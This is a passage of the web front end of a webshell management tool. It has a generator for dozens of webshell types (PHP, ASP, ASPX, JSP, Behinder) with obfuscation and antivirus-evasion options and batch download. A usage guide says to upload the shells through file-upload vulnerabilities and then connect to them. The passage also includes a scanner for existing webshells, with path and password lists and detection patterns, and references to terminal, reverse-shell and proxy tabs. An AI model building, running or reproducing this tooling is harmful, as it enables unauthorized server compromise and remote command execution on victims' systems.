                <button onclick="hideAddShellModal()" class="flex-1 bg-slate-700 hover:bg-slate-600 text-white text-xs py-2 rounded">å–æ¶ˆ</button>
                <button onclick="addNewShell()" class="flex-1 bg-pink-600 hover:bg-pink-700 text-white text-xs py-2 rounded">æ·»åŠ å¹¶æµ‹è¯•</button>
            </div>
        </div>
    </div>

    <!-- ç”Ÿæˆæœ¨é©¬æ¨¡æ€æ¡† -->
    <div id="generateShellModal" class="fixed inset-0 bg-black/50 flex items-center justify-center z-50 hidden">
        <div class="bg-slate-800 rounded-lg shadow-xl border border-slate-700 w-[700px] max-h-[90vh] flex flex-col">
            <div class="p-3 border-b border-slate-700 flex justify-between items-center shrink-0">
                <h3 class="text-sm font-bold text-purple-400">ğŸ§¬ Webshell ç”Ÿæˆå™¨ <span class="text-slate-500 text-xs">60+ ç§ç±»å‹</span></h3>
                <button onclick="hideGenerateShellModal()" class="text-slate-500 hover:text-white">&times;</button>
            </div>
            <div class="p-3 space-y-3 overflow-y-auto flex-1">
                <!-- åˆ†ç±»è¿‡æ»¤ -->
                <div class="flex gap-2 flex-wrap">
                    <button onclick="filterShellCategory('all')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-purple-600 text-white" data-cat="all">å…¨éƒ¨</button>
                    <button onclick="filterShellCategory('PHP 8.x')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="PHP 8.x">PHP 8.x</button>
                    <button onclick="filterShellCategory('PHP 7.x')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="PHP 7.x">PHP 7.x</button>
                    <button onclick="filterShellCategory('PHP é€šç”¨')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="PHP é€šç”¨">PHP é€šç”¨</button>
                    <button onclick="filterShellCategory('ASP')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="ASP">ASP</button>
                    <button onclick="filterShellCategory('ASPX')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="ASPX">ASPX</button>
                    <button onclick="filterShellCategory('JSP')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="JSP">JSP</button>
                    <button onclick="filterShellCategory('å†°è')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="å†°è">å†°è</button>
                    <button onclick="filterShellCategory('å…¶ä»–')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="å…¶ä»–">å…¶ä»–</button>
                </div>

                <!-- å¿«é€Ÿæ¨èæŒ‰é’® -->
                <div class="bg-slate-900 rounded p-2">
                    <div class="text-[10px] text-slate-500 mb-2">âš¡ å¿«é€Ÿé€‰æ‹© (æ ¹æ®ç›®æ ‡ PHP ç‰ˆæœ¬)</div>
                    <div class="flex gap-2 flex-wrap">
                        <button onclick="quickSelectShell('php8')" class="text-[10px] px-2 py-1 rounded bg-green-600 hover:bg-green-700 text-white">
                            PHP 8.x (æ¨è)
                        </button>
                        <button onclick="quickSelectShell('php7')" class="text-[10px] px-2 py-1 rounded bg-yellow-600 hover:bg-yellow-700 text-white">
                            PHP 7.x
                        </button>
                        <button onclick="quickSelectShell('bypass')" class="text-[10px] px-2 py-1 rounded bg-red-600 hover:bg-red-700 text-white">
                            å…æ€å‹
                        </button>
                        <button onclick="quickSelectShell('behinder')" class="text-[10px] px-2 py-1 rounded bg-blue-600 hover:bg-blue-700 text-white">
                            å†°èåŠ å¯†
                        </button>
                    </div>
                </div>

                <div class="grid grid-cols-3 gap-3">
                    <div>
                        <label class="block text-xs text-slate-400 mb-1">ç±»å‹</label>
                        <select id="genShellType" class="w-full bg-slate-900 text-slate-200 border border-slate-600 rounded p-2 text-xs" onchange="updateGeneratedShell()">
                            <optgroup label="ğŸŸ¢ PHP 8.x ä¸“ç”¨ (æ¨è)">
                                <option value="php8_eval">PHP8 Eval (æœ€å¯é )</option>
                                <option value="php8_system">PHP8 System</option>
                                <option value="php8_passthru">PHP8 Passthru</option>
                                <option value="php8_shell_exec">PHP8 Shell_Exec</option>
                                <option value="php8_proc_open">PHP8 Proc_Open (åŠŸèƒ½æœ€å¼º)</option>
                                <option value="php8_popen">PHP8 Popen</option>
                                <option value="php8_exec">PHP8 Exec</option>
                                <option value="php8_dynamic">PHP8 åŠ¨æ€å‡½æ•°</option>
                                <option value="php8_backtick">PHP8 åå¼•å·æ‰§è¡Œ</option>
                                <option value="php8_pcntl">PHP8 Pcntl_Exec</option>
                            </optgroup>
                            <optgroup label="ğŸŸ¡ PHP 7.x ä¸“ç”¨">
                                <option value="php7_create_function">PHP7 Create_Function</option>
                                <option value="php7_assert">PHP7 Assert</option>
                                <option value="php7_preg_replace">PHP7 Preg_Replace /e</option>
                            </optgroup>
                            <optgroup label="ğŸ”µ PHP é€šç”¨ (5.x-8.x)">
                                <option value="php_base64">PHP Base64ç¼–ç </option>
                                <option value="php_rot13">PHP ROT13ç¼–ç </option>
                                <option value="php_xor">PHP XORåŠ å¯†</option>
                                <option value="php_concat">PHP å­—ç¬¦ä¸²æ‹¼æ¥</option>
                                <option value="php_variable_func">PHP å˜é‡å‡½æ•°</option>
                                <option value="php_strrev">PHP å­—ç¬¦åè½¬</option>
                                <option value="php_multilayer_b64">PHP å¤šå±‚Base64</option>
                                <option value="php_gzip">PHP Gzipå‹ç¼©</option>
                                <option value="php_comment_split">PHP æ³¨é‡Šåˆ†å‰²</option>
                                <option value="php_unicode">PHP Unicodeç¼–ç </option>
                                <option value="php_hex">PHP Hexç¼–ç </option>
                                <option value="php_chr_shift">PHP Chrç¼–ç </option>
                                <option value="php_no_alpha_num">PHP æ— å­—æ¯æ•°å­—</option>
                            </optgroup>
                            <optgroup label="PHP å›è°ƒå‡½æ•°">
                                <option value="php_callback_array">PHP array_map</option>
                                <option value="php_callback_filter">PHP array_filter</option>
                                <option value="php_callback_walk">PHP array_walk</option>
                                <option value="php_callback_usort">PHP usort</option>
                                <option value="php_callback_reduce">PHP array_reduce</option>
                                <option value="php_preg_callback">PHP æ­£åˆ™å›è°ƒ</option>
                            </optgroup>
                            <optgroup label="PHP ç±»ä¸é­”æœ¯æ–¹æ³•">
                                <option value="php_class_construct">PHP __construct</option>
                                <option value="php_class_invoke">PHP __invoke</option>
                                <option value="php_class_call">PHP __call</option>
                                <option value="php_class_get">PHP __get</option>
                                <option value="php_reflection">PHP åå°„è°ƒç”¨</option>
                            </optgroup>
                            <optgroup label="PHP ä¼ å‚æ–¹å¼">
                                <option value="php_cookie">PHP Cookieä¼ å‚</option>
                                <option value="php_header">PHP Headerä¼ å‚</option>
                                <option value="php_request">PHP Requestæ··åˆ</option>
                                <option value="php_variable_overwrite">PHP å˜é‡è¦†ç›–</option>
                            </optgroup>
                            <optgroup label="PHP ç‰¹æ®Šç±»å‹">
                                <option value="php_include">PHP æ–‡ä»¶åŒ…å«</option>
                                <option value="php_dynamic_func">PHP åŠ¨æ€å‡½æ•°</option>
                                <option value="php_image_header">PHP å›¾ç‰‡é©¬</option>
                                <option value="php_session">PHP Sessionå‹</option>
                                <option value="php_log_include">PHP æ—¥å¿—åŒ…å«</option>
                                <option value="php_htaccess">.htaccessé…ç½®</option>
                            </optgroup>
                            <optgroup label="ASP ç³»åˆ—">
                                <option value="asp_simple">ASP ä¸€å¥è¯</option>
                                <option value="asp_encode">ASP ç¼–ç æ‰§è¡Œ</option>
                                <option value="asp_chr">ASP Chrç¼–ç </option>
                                <option value="asp_include">ASP SSIåŒ…å«</option>
                            </optgroup>
                            <optgroup label="ASPX ç³»åˆ—">
                                <option value="aspx_jscript">ASPX JScript</option>
                                <option value="aspx_csharp">ASPX C#å‘½ä»¤</option>
                                <option value="aspx_base64">ASPX Base64</option>
                                <option value="aspx_reflection">ASPX åå°„åŠ è½½</option>
                            </optgroup>
                            <optgroup label="JSP ç³»åˆ—">
                                <option value="jsp_runtime">JSP Runtimeæ‰§è¡Œ</option>
                                <option value="jsp_processbuilder">JSP ProcessBuilder</option>
                                <option value="jsp_scriptengine">JSP è„šæœ¬å¼•æ“</option>
                                <option value="jsp_expression">JSP ELè¡¨è¾¾å¼</option>
                                <option value="jsp_bsh">JSP BeanShell</option>
                            </optgroup>
                            <optgroup label="å†°èå¢å¼ºç‰ˆ">
                                <option value="behinder_php_enhanced">å†°è PHP å¢å¼ºç‰ˆ</option>
                                <option value="behinder_jsp_enhanced">å†°è JSP å¢å¼ºç‰ˆ</option>
                            </optgroup>
                            <optgroup label="Python">
                                <option value="py_flask">Python Flask</option>
                                <option value="py_django">Python Django</option>
                            </optgroup>
                            <optgroup label="å…¶ä»–è¯­è¨€">
                                <option value="nodejs_express">Node.js Express</option>
                                <option value="go_http">Go HTTP</option>
                            </optgroup>
                        </select>
                    </div>
                    <div>
                        <label class="block text-xs text-slate-400 mb-1">å¯†ç /å‚æ•°å</label>
                        <input type="text" id="genShellPassword" placeholder="cmd"
                               class="w-full bg-slate-900 text-yellow-400 border border-slate-600 rounded p-2 text-xs" oninput="updateGeneratedShell()">
                    </div>
                    <div>
                        <label class="block text-xs text-slate-400 mb-1">æ··æ·†çº§åˆ«</label>
                        <select id="genObfuscateLevel" class="w-full bg-slate-900 text-slate-200 border border-slate-600 rounded p-2 text-xs" onchange="updateGeneratedShell()">
                            <option value="none">æ— æ··æ·†</option>
                            <option value="basic">åŸºç¡€æ··æ·†</option>
                            <option value="variable">å˜é‡åæ··æ·†</option>
                            <option value="comment">æ·»åŠ å¹²æ‰°æ³¨é‡Š</option>
                        </select>
                    </div>
                </div>

                <!-- ç±»å‹è¯´æ˜ -->
                <div id="shellDescription" class="bg-slate-900 rounded p-2 text-xs text-slate-400">
                    <span class="text-cyan-400">ğŸ’¡ è¯´æ˜:</span> é€‰æ‹©ç±»å‹æŸ¥çœ‹è¯¦ç»†è¯´æ˜
                </div>

                <div>
                    <div class="flex justify-between items-center mb-1">
                        <label class="text-xs text-slate-400">ç”Ÿæˆçš„ä»£ç </label>
                        <div class="flex gap-2">
                            <span id="codeSize" class="text-[10px] text-slate-500">0 bytes</span>
                            <span id="codeLines" class="text-[10px] text-slate-500">0 è¡Œ</span>
                        </div>
                    </div>
                    <textarea id="generatedShellCode" rows="12" readonly
                              class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-2 text-xs font-mono"></textarea>
                </div>

                <!-- å¿«é€Ÿæ“ä½œ -->
                <div class="grid grid-cols-5 gap-2">
                    <button onclick="copyGeneratedShell()" class="bg-purple-600 hover:bg-purple-700 text-white text-xs py-2 rounded flex items-center justify-center gap-1">
                        ğŸ“‹ å¤åˆ¶
                    </button>
                    <button onclick="downloadGeneratedShell()" class="bg-green-600 hover:bg-green-700 text-white text-xs py-2 rounded flex items-center justify-center gap-1">
                        ğŸ’¾ ä¸‹è½½
                    </button>
                    <button onclick="generateAndAdd()" class="bg-pink-600 hover:bg-pink-700 text-white text-xs py-2 rounded flex items-center justify-center gap-1">
                        â• æ·»åŠ 
                    </button>
                    <button onclick="downloadAsZip()" class="bg-blue-600 hover:bg-blue-700 text-white text-xs py-2 rounded flex items-center justify-center gap-1">
                        ğŸ“¦ æ‰¹é‡
                    </button>
                    <button onclick="generateRandomShell()" class="bg-orange-600 hover:bg-orange-700 text-white text-xs py-2 rounded flex items-center justify-center gap-1">
                        ğŸ² éšæœº
                    </button>
                </div>

                <!-- ä½¿ç”¨æŒ‡å— -->
                <div class="bg-slate-900 rounded p-2">
                    <div class="flex justify-between items-center mb-1">
                        <span class="text-[10px] text-slate-500">ğŸ“– ä½¿ç”¨æŒ‡å—</span>
                        <button onclick="toggleUsageGuide()" class="text-[10px] text-blue-400 hover:text-blue-300">å±•å¼€/æ”¶èµ·</button>
                    </div>
                    <div id="usageGuide" class="text-[10px] text-slate-400 space-y-1 hidden">
                        <p><span class="text-cyan-400">1.</span> ç”Ÿæˆä»£ç å,å¤åˆ¶æˆ–ä¸‹è½½ä¿å­˜ä¸º .php æ–‡ä»¶</p>
                        <p><span class="text-cyan-400">2.</span> å°†æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ (åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´)</p>
                        <p><span class="text-cyan-400">3.</span> ç‚¹å‡» "æ·»åŠ  Shell" è¾“å…¥ URL å’Œå¯†ç </p>
                        <p><span class="text-cyan-400">4.</span> é€‰æ‹©æ­£ç¡®çš„ç±»å‹ (php8_eval å¯¹åº” PHP 8.x)</p>
                        <p><span class="text-yellow-400">âš ï¸</span> å¦‚æœè¿æ¥å¤±è´¥,å°è¯•å…¶ä»–ç±»å‹æˆ–æ£€æŸ¥ disable_functions</p>
                        <p><span class="text-green-400">ğŸ’¡</span> PHP 8.x é¶åœºæ¨èä½¿ç”¨: php8_eval æˆ– php8_proc_open</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- æ‰¹é‡ä¸‹è½½é€‰æ‹©æ¨¡æ€æ¡† -->
    <div id="batchDownloadModal" class="fixed inset-0 bg-black/50 flex items-center justify-center z-[60] hidden">
        <div class="bg-slate-800 rounded-lg shadow-xl border border-slate-700 w-[500px] max-h-[70vh]">
            <div class="p-3 border-b border-slate-700 flex justify-between items-center">
                <h3 class="text-sm font-bold text-blue-400">ğŸ“¦ æ‰¹é‡ä¸‹è½½ Webshell</h3>
                <button onclick="hideBatchDownloadModal()" class="text-slate-500 hover:text-white">&times;</button>
            </div>
            <div class="p-3 space-y-3 max-h-[50vh] overflow-y-auto">
                <div class="flex justify-between items-center mb-2">
                    <span class="text-xs text-slate-400">é€‰æ‹©è¦ä¸‹è½½çš„ç±»å‹:</span>
                    <div class="flex gap-2">
                        <button onclick="selectAllShells()" class="text-[10px] text-blue-400 hover:text-blue-300">å…¨é€‰</button>
                        <button onclick="deselectAllShells()" class="text-[10px] text-slate-400 hover:text-slate-300">å–æ¶ˆå…¨é€‰</button>
                    </div>
                </div>
                <div id="batchShellList" class="space-y-1">
                    <!-- åŠ¨æ€ç”Ÿæˆ -->
                </div>
            </div>
            <div class="p-3 border-t border-slate-700 flex gap-2">
                <button onclick="hideBatchDownloadModal()" class="flex-1 bg-slate-700 hover:bg-slate-600 text-white text-xs py-2 rounded">å–æ¶ˆ</button>
                <button onclick="executeBatchDownload()" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white text-xs py-2 rounded">ä¸‹è½½é€‰ä¸­ (<span id="selectedCount">0</span>)</button>
            </div>
        </div>
    </div>

    <!-- å¯¼å…¥æ¨¡æ€æ¡† -->
    <div id="importModal" class="fixed inset-0 bg-black/50 flex items-center justify-center z-50 hidden">
        <div class="bg-slate-800 rounded-lg shadow-xl border border-slate-700 w-[450px]">
            <div class="p-3 border-b border-slate-700 flex justify-between items-center">
                <h3 class="text-sm font-bold text-cyan-400">å¯¼å…¥ Shell é…ç½®</h3>
                <button onclick="hideImportModal()" class="text-slate-500 hover:text-white">&times;</button>
            </div>
            <div class="p-3 space-y-3">
                <div>
                    <label class="block text-xs text-slate-400 mb-1">æ ¼å¼</label>
                    <select id="importFormat" class="w-full bg-slate-900 text-slate-200 border border-slate-600 rounded p-2 text-xs">
                        <option value="json">JSON</option>
                        <option value="csv">CSV</option>
                    </select>
                </div>
                <div>
                    <label class="block text-xs text-slate-400 mb-1">æ•°æ®</label>
                    <textarea id="importData" rows="8" placeholder="ç²˜è´´ JSON æˆ– CSV æ•°æ®..."
                              class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-2 text-xs font-mono"></textarea>
                </div>
            </div>
            <div class="p-3 border-t border-slate-700 flex gap-2">
                <button onclick="hideImportModal()" class="flex-1 bg-slate-700 hover:bg-slate-600 text-white text-xs py-2 rounded">å–æ¶ˆ</button>
                <button onclick="importShells()" class="flex-1 bg-cyan-600 hover:bg-cyan-700 text-white text-xs py-2 rounded">å¯¼å…¥</button>
            </div>
        </div>
    </div>

    <script>
        // Socket.IO è¿æ¥
        let socket = null;

        // åˆå§‹åŒ–
        document.addEventListener('DOMContentLoaded', async function() {
            // åˆå§‹åŒ– Socket.IO
            socket = io();

            socket.on('connect', () => {
                console.log('[+] Socket.IO å·²è¿æ¥');
                addScanLog('[+] Socket.IO å·²è¿æ¥', 'success');
            });

            socket.on('disconnect', () => {
                console.log('[-] Socket.IO æ–­å¼€');
            });

            // æ¥æ”¶æ‰«ææ—¥å¿—
            socket.on('log', (data) => {
                if (data.source === 'webshell-scan') {
                    addScanLog(data.data, 'info');
                    // æ£€æµ‹æ˜¯å¦å‘ç°äº†webshell
                    if (data.data.includes('[200]') || data.data.includes('Found')) {
                        const urlMatch = data.data.match(/https?:\/\/[^\s]+/);
                        if (urlMatch) {
                            addFoundShell(urlMatch[0], 'scan', 'æ‰«æå‘ç°');
                        }
                    }
                }
            });

            socket.on('scan-status', (data) => {
                if (data.type === 'webshell-scan') {
                    if (data.status === 'stopped') {
                        addScanLog('[âœ“] æ‰«æå®Œæˆ', 'success');
                    }
                }
            });

            WebshellCore.init();
            refreshShellList();
            updateGeneratedShell();

            // è‡ªåŠ¨å¡«å…¥æœ¬æœº IP
            document.getElementById('reverseIp').placeholder = window.location.hostname;

            // ç»ˆç«¯è¾“å…¥ç›‘å¬
            document.getElementById('terminalInput').addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    executeTerminalCommand();
                }
            });

            // åˆå§‹åŒ–åŠ å¯†çŠ¶æ€æ˜¾ç¤º
            updateCryptoStatus(false);
        });

        // æ›´æ–°åŠ å¯†çŠ¶æ€æ˜¾ç¤º
        function updateCryptoStatus(enabled, shell = null) {
            const statusEl = document.getElementById('cryptoStatus');
            const iconEl = document.getElementById('cryptoIcon');
            const textEl = document.getElementById('cryptoText');
            const sessionBar = document.getElementById('sessionInfoBar');

            if (enabled && shell) {
                statusEl.classList.remove('hidden', 'bg-slate-800', 'text-slate-500');
                statusEl.classList.add('bg-green-900/50', 'text-green-400', 'crypto-active');
                iconEl.textContent = 'ğŸ”';
                iconEl.classList.add('animate-pulse');
                textEl.textContent = 'AES-256';

                // æ˜¾ç¤ºä¼šè¯ä¿¡æ¯
                sessionBar.classList.remove('hidden');
                document.getElementById('sessionId').textContent = shell.crypto?.sessionId?.substring(0, 8) || '-';
                document.getElementById('sequenceNum').textContent = shell.crypto?.sequence || 0;
                document.getElementById('currentUA').textContent = shell.userAgent === 'random' ? 'Random' : shell.userAgent;
            } else {
                statusEl.classList.remove('bg-green-900/50', 'text-green-400', 'crypto-active');
                statusEl.classList.add('bg-slate-800', 'text-slate-500');
                iconEl.textContent = 'ğŸ”“';
                iconEl.classList.remove('animate-pulse');
                textEl.textContent = 'æœªåŠ å¯†';
                sessionBar.classList.add('hidden');
            }
        }

        // Tab åˆ‡æ¢
        function switchTab(tabName) {
            const tabs = ['scanner', 'terminal', 'files', 'reverse', 'proxy', 'info', 'config'];
            tabs.forEach(t => {
                document.getElementById(`tab-${t}`).classList.remove('text-pink-400', 'bg-slate-800', 'border-b-2', 'border-pink-500');
                document.getElementById(`tab-${t}`).classList.add('text-slate-400');
                document.getElementById(`panel-${t}`).classList.add('hidden');
            });
            document.getElementById(`tab-${tabName}`).classList.add('text-pink-400', 'bg-slate-800', 'border-b-2', 'border-pink-500');
            document.getElementById(`tab-${tabName}`).classList.remove('text-slate-400');
            document.getElementById(`panel-${tabName}`).classList.remove('hidden');

            // åˆ·æ–°ç‰¹å®š Tab
            if (tabName === 'files' && WebshellCore.getActiveShell()) {
                refreshFileList();
            } else if (tabName === 'info' && WebshellCore.getActiveShell()) {
                refreshSystemInfo();
            }
        }

        // ==================== æ‰«æåŠŸèƒ½ ====================

        let scanState = {
            running: false,
            target: '',
            foundShells: [],
            scannedPaths: 0
        };

        // SecLists è·¯å¾„
        const SECLISTS_PATH = '/usr/share/seclists';
        const WEBSHELL_WORDLIST = SECLISTS_PATH + '/Web-Shells/backdoor_list.txt';
        const DIR_WORDLIST = SECLISTS_PATH + '/Discovery/Web-Content/common.txt';
        const DIR_MEDIUM_WORDLIST = SECLISTS_PATH + '/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt';

        // å¸¸è§ webshell è·¯å¾„ (å¤‡ç”¨)
        const COMMON_SHELL_PATHS = [
            '/shell.php', '/cmd.php', '/c.php', '/b.php', '/a.php', '/1.php', '/x.php', '/test.php',
            '/admin/shell.php', '/admin/cmd.php', '/admin/config.php', '/admin/upload.php',
            '/upload/shell.php', '/uploads/shell.php', '/uploadfiles/shell.php',
            '/images/shell.php', '/img/shell.php', '/pic/shell.php', '/assets/shell.php',
            '/tmp/shell.php', '/temp/shell.php', '/cache/shell.php', '/log/shell.php',
            '/backup/shell.php', '/bak/shell.php', '/.shell.php', '/config.php',
            '/behinder.php', '/ant.php', '/antsword.php', '/b374k.php', '/wso.php',
            '/c99.php', '/r57.php', '/webshell.php', '/cmd.asp', '/shell.aspx', '/cmd.aspx'
        ];

        // å¸¸è§å¯†ç 
        const COMMON_PASSWORDS = ['cmd', 'pass', 'password', 'shell', 'admin', 'root', 'test', '123456', 'c', 'b', 'a', 'x', 'key', 'secret', 'pwd'];

        // å¼€å§‹è‡ªåŠ¨æ‰«æ
        async function startAutoScan() {
            let targetUrl = document.getElementById('scanTargetUrl').value.trim();
            if (!targetUrl) {
                alert('è¯·è¾“å…¥ç›®æ ‡ç½‘å€');
                return;
            }

            // ç¡®ä¿URLæ ¼å¼æ­£ç¡®
            if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
                targetUrl = 'http://' + targetUrl;
            }

            scanState.running = true;
            scanState.target = targetUrl.replace(/\/$/, '');
            scanState.foundShells = [];
            scanState.scannedPaths = 0;

            document.getElementById('startScanBtn').classList.add('hidden');
            document.getElementById('stopScanBtn').classList.remove('hidden');
            document.getElementById('foundShells').innerHTML = '<div class="text-slate-600 text-xs text-center py-4">æ‰«æä¸­...</div>';
            document.getElementById('scanLogs').innerHTML = '';

            addScanLog(`[*] å¼€å§‹æ‰«æ: ${scanState.target}`, 'info');
            updateScanProgress('æ­£åœ¨æ‰«æ...');

            try {
                // 1. è°ƒç”¨åç«¯ Nuclei æ‰«æ webshell POC
                if (document.getElementById('scanNuclei').checked) {
                    addScanLog('[*] Nuclei Webshell POC æ‰«æ...', 'info');
                    await runBackendNucleiScan();
                }

                // 2. è°ƒç”¨åç«¯ gobuster/dirb ä½¿ç”¨ seclists æ‰«æ
                if (document.getElementById('scanCommonPaths').checked || document.getElementById('scanFuzz').checked) {
                    addScanLog('[*] ä½¿ç”¨ SecLists å­—å…¸æ‰«æ...', 'info');
                    await runBackendFuzzScan();
                }

                // 3. å‰ç«¯å¿«é€Ÿæ‰«æ (è¡¥å……)
                if (document.getElementById('scanCommonPaths').checked) {
                    addScanLog('[*] å‰ç«¯å¿«é€Ÿæ‰«æå¸¸è§è·¯å¾„...', 'info');
                    await frontendQuickScan();
                }

                // 4. æ‰«æå¤‡ä»½æ–‡ä»¶
                if (document.getElementById('scanBackup').checked) {
                    addScanLog('[*] æ‰«æå¤‡ä»½æ–‡ä»¶...', 'info');
                    await scanBackupFiles();
                }

                addScanLog('[âœ“] æ‰«æå®Œæˆ!', 'success');
            } catch (e) {
                addScanLog(`[!] æ‰«æé”™è¯¯: ${e.message}`, 'error');
            }

            scanState.running = false;
            document.getElementById('startScanBtn').classList.remove('hidden');
            document.getElementById('stopScanBtn').classList.add('hidden');
            updateScanProgress('å®Œæˆ');
        }

        function stopAutoScan() {
            scanState.running = false;

            // åœæ­¢åç«¯æ‰«æ
            if (socket) {
                socket.emit('stop-scan', 'nuclei');
                socket.emit('stop-scan', 'webshell-scan');
            }

            addScanLog('[!] æ‰«æå·²åœæ­¢', 'warning');
            document.getElementById('startScanBtn').classList.remove('hidden');
            document.getElementById('stopScanBtn').classList.add('hidden');
        }

        // åç«¯ Nuclei æ‰«æ
        async function runBackendNucleiScan() {
            return new Promise((resolve) => {
                if (!socket || !socket.connected) {
                    addScanLog('[!] Socket æœªè¿æ¥', 'error');
                    resolve();
                    return;
                }

                const nucleiHandler = (data) => {
                    if (data.source === 'nuclei') {
                        // æ£€æµ‹å‘ç°çš„æ¼æ´/è·¯å¾„
                        const text = data.data;
                        if (text.includes('[webshell]') || text.includes('[backdoor]') || text.includes('shell')) {
                            const urlMatch = text.match(/https?:\/\/[^\s\]]+/);
                            if (urlMatch) {
                                addFoundShell(urlMatch[0], 'nuclei', 'Nuclei POC');
                            }
                        }
                    }
                };

                socket.on('log', nucleiHandler);

                socket.emit('start-nuclei', {
                    target: scanState.target,
                    args: '-t http/vulnerabilities -silent -stats'
                });

                // 30ç§’åè¶…æ—¶
                setTimeout(() => {
                    socket.off('log', nucleiHandler);
                    resolve();
                }, 30000);
            });
        }

        // åç«¯ Fuzz æ‰«æ (ä½¿ç”¨ seclists)
        async function runBackendFuzzScan() {
            return new Promise((resolve) => {
                if (!socket || !socket.connected) {
                    addScanLog('[!] Socket æœªè¿æ¥ï¼Œä½¿ç”¨å‰ç«¯æ‰«æ', 'warning');
                    resolve();
                    return;
                }

                // æ£€æŸ¥ seclists æ˜¯å¦å­˜åœ¨ï¼Œä½¿ç”¨æ­£ç¡®çš„å­—å…¸
                const scanHandler = (data) => {
                    if (data.source === 'webshell-scan') {
                        addScanLog(data.data, 'info');

                        // æ£€æµ‹200å“åº”
                        if (data.data.includes('200') || data.data.includes('Found')) {
                            const urlMatch = data.data.match(/https?:\/\/[^\s]+/);
                            if (urlMatch) {
                                addFoundShell(urlMatch[0], 'fuzz', 'å­—å…¸æ‰«æ');
                            }
                        }
                    }
                };

                socket.on('log', scanHandler);

                // å‘é€è‡ªå®šä¹‰æ‰«æäº‹ä»¶
                socket.emit('start-webshell-scan', {
                    target: scanState.target,
                    wordlist: WEBSHELL_WORDLIST,
                    threads: 50
                });

                // 60ç§’åè¶…æ—¶
                setTimeout(() => {
                    socket.off('log', scanHandler);
                    resolve();
                }, 60000);
            });
        }

        // å‰ç«¯å¿«é€Ÿæ‰«æ
        async function frontendQuickScan() {
            const batchSize = 10;
            for (let i = 0; i < COMMON_SHELL_PATHS.length; i += batchSize) {
                if (!scanState.running) break;

                const batch = COMMON_SHELL_PATHS.slice(i, i + batchSize);
                const promises = batch.map(async (path) => {
                    const url = scanState.target + path;
                    try {
                        const response = await fetch(url, { method: 'GET', signal: AbortSignal.timeout(5000) });
                        if (response.ok) {
                            const text = await response.text();
                            if (isWebshellResponse(text, url)) {
                                addFoundShell(url, 'quick', 'å¿«é€Ÿæ‰«æ');
                            } else {
                                // å³ä½¿æ²¡æœ‰ç‰¹å¾ï¼Œ200å“åº”ä¹Ÿè®°å½•
                                addScanLog(`[200] ${url}`, 'info');
                            }
                        }
                    } catch (e) {
                        // å¿½ç•¥
                    }
                });

                await Promise.all(promises);
                scanState.scannedPaths += batch.length;
                updateScanProgress(`å·²æ‰«æ ${scanState.scannedPaths} è·¯å¾„`);
            }
        }

        // æ£€æµ‹ webshell å“åº”ç‰¹å¾
        function isWebshellResponse(text, url) {
            const patterns = [
                /eval\s*\(/i, /assert\s*\(/i, /system\s*\(/i, /passthru\s*\(/i,
                /shell_exec\s*\(/i, /exec\s*\(/i, /popen\s*\(/i, /proc_open\s*\(/i,
                /\$_POST\s*\[/i, /\$_GET\s*\[/i, /\$_REQUEST\s*\[/i,
                /base64_decode\s*\(/i, /gzinflate\s*\(/i, /str_rot13\s*\(/i,
                /Runtime\.getRuntime\(\)/i, /ProcessBuilder/i,
                /<form[^>]*method[^>]*post/i, /<input[^>]*type[^>]*password/i,
                /c99/i, /r57/i, /wso/i, /b374k/i,
                /behinder/i, /antsword/i, /å†°è/i, /èšå‰‘/i
            ];

            for (const pattern of patterns) {
                if (pattern.test(text)) {
                    return true;
                }
            }

            // æ£€æŸ¥URLæ˜¯å¦åŒ…å«å¯ç–‘å…³é”®è¯
            const suspiciousNames = ['shell', 'cmd', 'webshell', 'backdoor', 'c99', 'r57', 'wso', 'b374k', 'behinder', 'ant'];
            const filename = url.split('/').pop().toLowerCase();
            for (const name of suspiciousNames) {
                if (filename.includes(name)) {
                    return true;
                }
            }

            return false;
        }

        // æ‰«æå¤‡ä»½æ–‡ä»¶
        async function scanBackupFiles() {
            const commonFiles = ['index.php', 'config.php', 'admin.php', 'upload.php', 'db.php', 'conn.php'];
            const suffixes = ['.bak', '.backup', '.old', '.orig', '.save', '.swp', '.tmp', '~', '.zip', '.tar.gz', '.rar'];

            for (const file of commonFiles) {
                if (!scanState.running) break;

                for (const suffix of suffixes) {
                    const url = scanState.target + '/' + file + suffix;
                    try {
                        const response = await fetch(url, { method: 'HEAD', signal: AbortSignal.timeout(3000) });
                        if (response.ok) {
                            addScanLog(`[+] å‘ç°å¤‡ä»½: ${url}`, 'success');
                        }
                    } catch (e) {}
                }
            }
        }

        // æ·»åŠ æ‰«ææ—¥å¿—
        function addScanLog(message, type = 'info') {
            const logsEl = document.getElementById('scanLogs');
            const colors = {
                'info': 'text-cyan-400',
                'success': 'text-green-400',
                'error': 'text-red-400',
                'warning': 'text-yellow-400'
            };

            const entry = document.createElement('div');
            entry.className = colors[type] || 'text-slate-400';
            entry.textContent = message;

            if (logsEl.querySelector('.text-slate-600')) {
                logsEl.innerHTML = '';
            }
            logsEl.appendChild(entry);
            logsEl.scrollTop = logsEl.scrollHeight;
        }

        // æ›´æ–°æ‰«æè¿›åº¦
        function updateScanProgress(text) {
            document.getElementById('scanProgress').textContent = text;
        }

        // æ·»åŠ å‘ç°çš„ shell
        function addFoundShell(url, type, description) {
            // é¿å…é‡å¤
            if (scanState.foundShells.find(s => s.url === url)) return;

